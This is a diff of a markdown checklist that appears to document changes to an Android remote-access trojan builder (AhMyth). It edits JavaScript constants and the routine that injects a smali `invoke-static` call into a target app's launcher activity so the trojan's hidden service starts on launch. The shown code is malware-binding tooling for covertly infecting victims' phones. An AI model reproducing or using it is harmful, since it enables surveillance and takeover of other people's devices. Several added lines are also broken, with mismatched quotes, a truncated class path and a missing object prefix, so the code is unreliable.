@@ -8,22 +8,27 @@
 #
 - [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
 ```js
-exports.hookPoint = "return-void";
+exports.hookPoint = '\n\n' + 
+'return-void";
 ```
 ...then replace the exported `serviceSrc` variable in the `Constants.js` file, with the new static hook metbod...
 ```js
 exports.serviceSrc = '\n\n' +
-'invoke-static {}, Lahmyth/mine/king/ahmyth/';
+'invoke-static {}, L';
 ```
 ...then replace the exported `serviceStart` variable in the `Constants.js` file....
 ```js
-exports.serviceStart = 'MainService;->start()V' +
+exports.serviceStart = ';->start()V' +
 '\n\n' +
 'return-void';
 ```
 ....then replace the the old `onCreate` hook point code, with the new code for the new static hook function.
 ```js
-var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart; 
+var regex = /\/(\S+)\./;
+var str = launcherPath;
+var m = str.match(regex);
+
+var startService = serviceSrc + m[1] + serviceStart;
 
 var key = CONSTANTS.hookPoint;
 $appCtrl.Log("Modifiying Launcher Activity...");
